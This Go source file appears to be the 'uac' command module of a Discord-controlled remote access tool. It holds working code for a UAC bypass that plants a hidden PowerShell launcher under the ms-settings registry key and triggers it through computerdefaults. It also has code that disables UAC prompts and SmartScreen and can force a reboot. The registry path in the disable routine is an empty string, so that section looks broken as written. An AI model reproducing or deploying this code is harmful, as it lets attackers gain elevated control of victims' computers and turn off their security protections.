package commands

import (
	"fmt"
	"os"
	"strings"
	"time"

	"requiem/store"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	MS_SETTINGS       string = "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command"
	CURRENT_POLICIES  string = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
	SOFTWARE_POLICIES string = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"
)

func (*AdminCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")

	if utils.HasFlag(content, "check") {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("Elevated: %t", store.IsAdmin), msg.Reference())
		return
	}

	// if utils.HasFlag(content, "ask") {
	// 	utils.RemoveMutex()

	// 	elevated := funcs.AttempElevate()
	// 	if !elevated {
	// 		utils.CheckMutex()

	// 		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 User did not accept the UAC prompt.", msg.Reference())
	// 		return
	// 	}

	// 	ses.ChannelMessageSendReply(msg.ChannelID, "🟩 UAC prompt accepted, restarting...", msg.Reference())
	// 	return
	// }

	if utils.HasFlag(content, "bypass") {
		ses.ChannelMessageSendReply(msg.ChannelID, "Attempting to elevate...", msg.Reference())

		command := fmt.Sprintf(
			"powershell -nop -w hidden -ep bypass -c \"& '%s' %s %d\"",
			store.ExecPath,
			store.LAUNCH_KEY,
			os.Getpid(),
		)

		err := utils.RunCommand(
			"reg", "add",
			MS_SETTINGS,
			"/ve", "/d", command,
			"/f",
		)

		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to create registry key (1) - %s", err), msg.Reference())
			return
		}

		err = utils.RunCommand(
			"reg", "add",
			MS_SETTINGS,
			"/v", "DelegateExecute",
			"/d", "",
			"/f",
		)

		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to create registry key (2) - %s", err), msg.Reference())
			return
		}

		// this took way too fucking long to figure out lmao
		utils.RemoveMutex()

		err = utils.RunCommand("cmd", "/c", "start computerdefaults")
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to run - %s", err), msg.Reference())
			return
		}

		time.Sleep(2 * time.Second)

		utils.RunCommand(
			"reg", "delete",
			"HKCU\\Software\\Classes\\ms-settings",
			"/f",
		)

		return
	}

	if utils.HasFlag(content, "disable") {
		if !store.IsAdmin {
			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Administrator privileges are required to do this.", msg.Reference())
			return
		}

		err := utils.RunCommand(
			"reg", "add",
			"",
			"/v", "EnableLUA",
			"/t", "REG_DWORD",
			"/d", "0",
			"/f",
		)

		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to disable limited user account - %s", err), msg.Reference())
		}

		err = utils.RunCommand(
			"reg", "add",
			"",
			"/v", "ConsentPromptBehaviorAdmin",
			"/t", "REG_DWORD",
			"/d", "0",
			"/f",
		)

		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to disable consent prompt - %s", err), msg.Reference())
		}

		err = utils.RunCommand(
			"reg", "add",
			"",
			"/v", "PromptOnSecureDesktop",
			"/t", "REG_DWORD",
			"/d", "0",
			"/f",
		)

		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to disable secure prompt - %s", err), msg.Reference())
		}

		err = utils.RunCommand(
			"reg", "add",
			"",
			"/v", "EnableSmartScreen",
			"/t", "REG_DWORD",
			"/d", "0",
			"/f",
		)

		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to disable smart screen - %s", err), msg.Reference())
		}

		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully disabled UAC related settings.", msg.Reference())

		if utils.HasFlag(content, "force") {
			utils.RunCommand("shutdown", "/r", "/f", "/t", "0")
		}

		return
	}

	ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
}

func (*AdminCommand) Name() string {
	return "uac"
}

func (*AdminCommand) Info() string {
	return "UAC related utilities."
}

type AdminCommand struct{}
